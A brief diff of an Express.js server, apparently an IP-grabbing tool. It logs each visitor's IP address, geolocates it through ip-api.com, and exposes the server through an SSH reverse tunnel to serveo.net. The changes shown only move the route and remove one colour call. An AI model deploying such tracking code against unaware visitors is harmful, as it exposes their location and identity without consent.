@@ -13,7 +13,7 @@ const host = "127.0.1"
 
 app.use(express.static('server.tg'));
 
-app.get(('/t'), (req, res)  => {
+app.get(('/'), (req, res)  => {
 const userIp = req.headers['x-forwarded-for'] || req.ip;
 console.log('[!] New IP '.white.bold, userIp.green.bold);
 http.get(`http://ip-api.com/json/${userIp}`, (resp) => {
@@ -49,6 +49,6 @@ console.log(`[+] Server Running in PORT =>`.white.bold +` ${port}`.yellow.bold);
     const sshProcess = spawn('ssh', ['-R', '80:localhost:4040', 'serveo.net'], { stdio: 'inherit' });
 
     sshProcess.on('close', (code) => {
-        console.log(` SSH code ${code}`.red.bold);
+        console.log(` SSH code ${code}`);
     });
 })
